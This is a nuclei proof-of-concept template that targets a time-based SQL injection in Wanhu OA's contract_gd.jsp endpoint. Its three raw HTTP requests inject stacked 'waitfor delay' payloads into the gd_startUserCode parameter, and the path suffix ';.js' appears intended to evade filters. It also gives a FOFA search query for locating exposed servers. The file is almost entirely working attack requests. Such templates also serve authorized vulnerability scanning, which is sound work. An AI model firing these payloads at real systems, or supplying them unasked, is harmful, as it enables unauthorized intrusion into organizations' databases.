# Add your nuclei formatted PoC!
id: wanhu-contract_gd-sqli
 
info:
  name: 万户OA-contract_gd-sql注入
  author: 蜜汁狗蛋
  severity: high
  metadata:
    fofa-query: body="/defaultroot/"
 
 
http:
  - raw:
      - |
        GET /defaultroot/modules/subsidiary/contract/contract_gd.jsp;.js?gd=1&gd_startUserCode=1%27%3Bwaitfor%20delay%20%270%3A0%3A2%27-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive
      - |
        GET /defaultroot/modules/subsidiary/contract/contract_gd.jsp;.js?gd=1&gd_startUserCode=1%27%3Bwaitfor%20delay%20%270%3A0%3A4%27-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive
      - |
        GET /defaultroot/modules/subsidiary/contract/contract_gd.jsp;.js?gd=1&gd_startUserCode=1%27%3Bwaitfor%20delay%20%270%3A0%3A6%27-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=2  && duration_1<=4"
          - "duration_2>=4  && duration_2<=6"
          - "duration_3>=6  && duration_3<=8"
author: 蜜汁狗蛋
